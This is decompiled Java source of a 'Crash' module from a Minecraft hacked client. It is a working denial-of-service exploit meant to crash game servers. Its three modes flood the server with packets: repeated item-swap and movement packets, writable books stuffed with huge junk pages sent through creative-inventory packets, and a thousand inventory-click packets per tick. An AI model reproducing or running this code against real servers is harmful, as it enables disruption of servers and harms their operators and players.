/*    */ package me.abHack.features.modules.misc;
/*    */ 
/*    */ import java.util.Objects;
/*    */ import java.util.regex.Pattern;
/*    */ import me.abHack.OyVey;
/*    */ import me.abHack.features.modules.Module;
/*    */ import me.abHack.features.setting.Setting;
/*    */ import net.minecraft.client.network.NetHandlerPlayClient;
/*    */ import net.minecraft.init.Items;
/*    */ import net.minecraft.inventory.ClickType;
/*    */ import net.minecraft.item.ItemStack;
/*    */ import net.minecraft.nbt.NBTBase;
/*    */ import net.minecraft.nbt.NBTTagCompound;
/*    */ import net.minecraft.nbt.NBTTagList;
/*    */ import net.minecraft.nbt.NBTTagString;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketClickWindow;
/*    */ import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
/*    */ import net.minecraft.network.play.client.CPacketPlayer;
/*    */ import net.minecraft.network.play.client.CPacketPlayerDigging;
/*    */ import net.minecraft.util.EnumFacing;
/*    */ import net.minecraft.util.EnumHand;
/*    */ import net.minecraft.util.math.BlockPos;
/*    */ 
/*    */ public class Crash extends Module {
/* 26 */   private final Setting<Mode> mode = register(new Setting("Mode", Mode.Swap));
/* 27 */   private final Setting<Boolean> escoff = register(new Setting("EscOff", Boolean.valueOf(true)));
/* 28 */   private final Setting<String> speed = register(new Setting("Speed", "420", v -> (this.mode.getValue() == Mode.Offhand)));
/*    */   
/*    */   public Crash() {
/* 31 */     super("Crash", "crash", Module.Category.MISC, true, false, false);
/*    */   }
/*    */   
/*    */   public static boolean isInteger(String str) {
/* 35 */     Pattern pattern = Pattern.compile("^[-\\+]?[\\d]*$");
/* 36 */     return pattern.matcher(str).matches();
/*    */   }
/*    */   
/*    */   public void onLogout() {
/* 40 */     if (((Boolean)this.escoff.getValue()).booleanValue() && OyVey.moduleManager.isModuleEnabled("Crash"))
/* 41 */       disable(); 
/*    */   }
/*    */   
/*    */   public void onLogin() {
/* 45 */     if (((Boolean)this.escoff.getValue()).booleanValue() && OyVey.moduleManager.isModuleEnabled("Crash"))
/* 46 */       disable(); 
/*    */   }
/*    */   
/*    */   public void onTick() {
/* 50 */     if (fullNullCheck()) {
/*    */       return;
/*    */     }
/* 53 */     if (this.mode.getValue() == Mode.Offhand && isInteger((String)this.speed.getValue())) {
/* 54 */       for (int i = 0; i < Integer.parseInt((String)this.speed.getValue()); i++) {
/* 55 */         mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, EnumFacing.UP));
/* 56 */         mc.player.connection.sendPacket((Packet)new CPacketPlayer(true));
/*    */       } 
/*    */     }
/* 59 */     if (this.mode.getValue() == Mode.Book) {
/* 60 */       ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
/* 61 */       NBTTagList list = new NBTTagList();
/* 62 */       NBTTagCompound tag = new NBTTagCompound();
/*    */       int i;
/* 64 */       for (i = 0; i < 50; i++) {
/* 65 */         NBTTagString tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
/* 66 */         list.appendTag((NBTBase)tString);
/*    */       } 
/* 68 */       tag.setString("author", "Gqrl");
/* 69 */       tag.setString("title", "https://wwww.baidu.com");
/* 70 */       tag.setTag("pages", (NBTBase)list);
/* 71 */       book.setTagInfo("pages", (NBTBase)list);
/* 72 */       book.setTagCompound(tag);
/* 73 */       for (i = 0; i < 100 && !mc.player.isSpectator(); i++) {
/* 74 */         ((NetHandlerPlayClient)Objects.<NetHandlerPlayClient>requireNonNull(mc.getConnection())).sendPacket((Packet)new CPacketCreativeInventoryAction(0, book));
/*    */       }
/*    */     } 
/* 77 */     if (this.mode.getValue() == Mode.Swap) {
/* 78 */       for (int j = 0; j < 1000; j++) {
/* 79 */         ItemStack item = new ItemStack(mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
/* 80 */         CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short)1);
/* 81 */         mc.player.connection.sendPacket((Packet)packet);
/*    */       } 
/*    */     }
/*    */   }
/*    */   
/*    */   public String getDisplayInfo() {
/* 87 */     return this.mode.getValue() + "";
/*    */   }
/*    */   
/*    */   public enum Mode
/*    */   {
/* 92 */     Swap,
/* 93 */     Offhand,
/* 94 */     Book;
/*    */   }
/*    */ }


/* Location:              C:\Users\Administrator\Videos\remapped.jar!\me\abHack\features\modules\misc\Crash.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */